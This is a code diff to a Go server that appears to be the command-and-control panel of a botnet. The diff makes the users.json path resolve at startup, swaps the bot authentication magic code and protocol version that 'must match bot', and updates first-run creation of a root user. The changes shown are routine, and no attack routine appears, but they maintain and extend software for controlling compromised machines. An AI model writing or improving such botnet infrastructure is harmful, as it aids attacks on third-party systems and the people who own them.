@@ -10,10 +10,25 @@ import (
 	"time"
 )
 
-const (
-	// File paths
-	USERS_FILE = "cnc/users.json"
+// usersFile is resolved at init to support running from project root or cnc dir
+var usersFile string
 
+func init() {
+	for _, path := range []string{"cnc/users.json", "users.json"} {
+		if _, err := os.Stat(path); err == nil {
+			usersFile = path
+			return
+		}
+	}
+	// Default — will be created on first run
+	if _, err := os.Stat("cnc"); err == nil {
+		usersFile = "cnc/users.json"
+	} else {
+		usersFile = "users.json"
+	}
+}
+
+const (
 	// Server IPs
 	USER_SERVER_IP = "0.0.0.0"
 	BOT_SERVER_IP  = "0.0.0.0"
@@ -25,8 +40,8 @@ const (
 	USER_SERVER_PORT = "420"
 
 	// Authentication  these must match bot
-	MAGIC_CODE       = "wM$hJABF&2oV@qky"
-	PROTOCOL_VERSION = "v4.1"
+	MAGIC_CODE       = "Kpog2p@7BkitGXbb"
+	PROTOCOL_VERSION = "v3.4.92"
 )
 
 type BotConnection struct {
@@ -113,7 +128,7 @@ func main() {
 	tuiMode = !splitMode
 
 	// First run: Create default root user with random 12-char password
-	if _, fileError := os.ReadFile(USERS_FILE); fileError != nil {
+	if _, fileError := os.ReadFile(usersFile); fileError != nil {
 		password, err := randomString(12)
 		if err != nil {
 			fmt.Println("Error generating password:", err)
@@ -133,7 +148,7 @@ func main() {
 			return
 		}
 
-		if err := os.WriteFile(USERS_FILE, bytes, 0600); err != nil {
+		if err := os.WriteFile(usersFile, bytes, 0600); err != nil {
 			fmt.Println("Error writing to users.json:", err)
 			return
 		}
